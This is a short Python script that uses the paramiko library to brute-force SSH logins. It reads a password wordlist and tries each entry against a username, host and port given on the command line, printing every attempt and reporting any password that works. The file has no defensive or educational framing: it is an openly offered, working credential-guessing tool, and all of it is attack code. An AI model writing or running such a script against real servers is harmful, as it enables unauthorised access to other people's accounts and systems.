import paramiko
import sys


#connect
def connect_ssh(username, password, host_ip, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy)

    try:
        ssh.connect(hostname=host_ip, port=port,username=username,password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:            #catching the authentication error
        return False 
    except (paramiko.SSHException, OSError) as e:
        print("[!] Connection Error")
        return False
    

def brute_ssh(passwordlist, username, host_ip, port):
    try:
        with open(passwordlist, 'r') as f:
            for line_num, line in enumerate(f, start=1):
                password = line.strip()
                print(f"[{line_num}]. Trying {username} : {password}")
                if connect_ssh(username,password, host_ip, port):
                    print(f"[#] Password found: {password} ")
                    return password
            print("Password not found. Try another wordlist.")
            return None
    except FileNotFoundError:
        print(f"The wordlist {passwordlist} is not found.")



def main():
    if len(sys.argv) < 4:
        print(f"Example use: python3 {sys.argv[0].split("/")[-1]} [username] [host_ip] [wordlist] [port(optional)]")
        sys.exit(1)
    
    username = sys.argv[1]
    host_ip = sys.argv[2]
    wordlist = sys.argv[3]
    port = sys.argv[4] if len(sys.argv) > 4 else 22
    print(f"""Starting with:
          
1. username = {username}
2. hostname = {host_ip}
3. wordlist = {wordlist}
4. port = {port}
------------------------""")
    try:
        brute_ssh(wordlist,username, host_ip,port)
    except Exception as e:
        print(f"The Error has occured: {e}")



main()


